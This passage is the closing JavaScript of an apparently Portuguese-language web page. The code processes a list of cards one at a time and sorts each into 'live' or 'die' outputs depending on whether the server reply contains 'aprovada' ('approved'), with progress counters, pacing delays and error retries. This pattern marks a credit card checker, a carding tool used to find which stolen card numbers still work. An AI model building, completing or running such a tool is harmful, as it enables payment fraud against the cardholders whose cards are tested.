                    if (!running && idx >= cards.length) return;
                    procN++;
                    const line = document.createElement('div');
                    line.className = 'result-line';
                    const ok = data.toLowerCase().includes('aprovada');
                    if (ok) {
                        line.classList.add('live');
                        line.innerHTML = '✅ ' + esc(data).replace(/\|/g, ' | ');
                        DOM.liveOut.insertBefore(line, DOM.liveOut.firstChild);
                        liveN++;
                    } else {
                        line.classList.add('die');
                        line.innerHTML = '❌ ' + esc(data).replace(/\|/g, ' | ');
                        DOM.dieOut.insertBefore(line, DOM.dieOut.firstChild);
                        dieN++;
                    }
                    updateCounters();
                    const fp = Math.round(((idx+1)/cards.length)*100);
                    DOM.progBar.style.width = fp + '%';
                    DOM.progPct.textContent = fp + '%';
                    idx++; ctrl = null;
                    if (idx % 3 === 0) ping();
                    setTimeout(next, 400);
                })
                .catch(e => {
                    const el = document.getElementById(tmpId); if (el) el.remove();
                    if (e.name === 'AbortError') return;
                    const line = document.createElement('div');
                    line.className = 'result-line die';
                    line.textContent = '⚠️ ERRO: ' + card;
                    DOM.dieOut.insertBefore(line, DOM.dieOut.firstChild);
                    dieN++; procN++; updateCounters();
                    idx++; ctrl = null;
                    setTimeout(next, 800);
                });
        }

        function esc(s) {
            return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').substring(0, 200);
        }

        window.addEventListener('beforeunload', e => {
            if (running) { e.preventDefault(); e.returnValue = 'Processo em andamento!'; }
        });
    </script>
</body>
</html>